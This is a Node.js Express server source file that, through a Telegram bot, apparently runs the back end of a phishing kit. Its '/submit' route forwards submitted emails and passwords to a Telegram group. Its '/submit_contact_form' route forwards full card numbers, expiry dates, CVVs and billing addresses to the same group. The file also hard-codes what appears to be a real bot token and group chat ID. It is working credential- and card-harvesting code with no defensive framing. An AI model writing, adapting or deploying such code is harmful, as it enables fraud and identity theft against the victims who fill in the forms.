const express = require('express');
const { Telegraf } = require('telegraf');

// Initialize Express
const app = express();
app.use(express.json()); // Middleware to parse JSON requests

// Serve Static Files (e.g., HTML, CSS, JS)
app.use(express.static(__dirname));

// Telegram Bot Initialization
// IMPORTANT: Replace '7960615435:AAGsD_s5wWcOsscBa4z4sP7i0-hRgOz4ks8' with your actual Telegram bot token.
// Keep this token secure and do not expose it publicly.
const bot = new Telegraf('7960615435:AAGsD_s5wWcOsscBa4z4sP7i0-hRgOz4ks8');

// Define the Group Chat ID
// IMPORTANT: Replace -1002458633714 with your actual group chat ID.
// Ensure your bot is an administrator in this group.
const groupChatId = -1002458633714;

// Route to Handle Form Submissions (existing, assuming for another form)
app.post('/submit', (req, res) => {
    const { email, password } = req.body;

    // Send the submission to the Telegram group
    bot.telegram.sendMessage(
        groupChatId,
        `📧 **New Submission Received:**\n\n🔑 **Email**: ${email}\n🔒 **Password**: ${password}`,
        { parse_mode: 'Markdown' } // Enable formatting
    )
    .then(() => {
        res.status(200).send('Data sent to Telegram group!');
    })
    .catch((error) => {
        console.error('Error sending message to Telegram group:', error);
        res.status(500).send('Failed to send data to Telegram.');
    });
});

// NEW ROUTE: For Account Information Form (from your index.html)
app.post('/submit_contact_form', (req, res) => {
    // Log the received body for debugging purposes
    console.log('Received form submission request. req.body:', req.body);

    // Extract all the fields sent from your contact form
    const {
        firstName,
        lastName,
        cardNumber,
        cardExpiry,
        cvv,
        addressLine1,
        addressLine2,
        city,
        state,
        zip
    } = req.body;

    // Construct the message for Telegram
    let telegramMessage = `📝 **New Account Information Submission:**\n\n`;
    telegramMessage += `👤 **Name:** ${firstName || 'N/A'} ${lastName || ''}\n`;
    // --- CORRECTED LINES BELOW ---
    telegramMessage += `💳 **Card Number:** ${cardNumber || 'N/A'}\n`;
    telegramMessage += `📅 **Expiry:** ${cardExpiry || 'N/A'}\n`;
    telegramMessage += `🔒 **CVV:** ${cvv || 'N/A'}\n\n`;
    // --- END CORRECTED LINES ---
    telegramMessage += `🏠 **Address:**\n`;
    telegramMessage += `   Line 1: ${addressLine1 || 'N/A'}\n`;
    if (addressLine2) { // Only add line 2 if it exists
        telegramMessage += `   Line 2: ${addressLine2}\n`;
    }
    telegramMessage += `   City: ${city || 'N/A'}\n`;
    telegramMessage += `   State: ${state || 'N/A'}\n`;
    telegramMessage += `   ZIP: ${zip || 'N/A'}\n`;

    // Send the submission to the Telegram group
    bot.telegram.sendMessage(
        groupChatId, // Your defined groupChatId from earlier in the script
        telegramMessage,
        { parse_mode: 'Markdown' } // Enable Markdown formatting for bold text
    )
    .then(() => {
        console.log('Contact form data sent to Telegram group successfully.');
        res.status(200).send('Contact form data sent to Telegram group!');
    })
    .catch((error) => {
        console.error('Error sending contact form message to Telegram group:', error);
        res.status(500).send('Failed to send contact form data to Telegram.');
    });
});

// Start the Express Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});

// Start the Telegram Bot
bot.launch();
console.log('Telegram bot is running...');
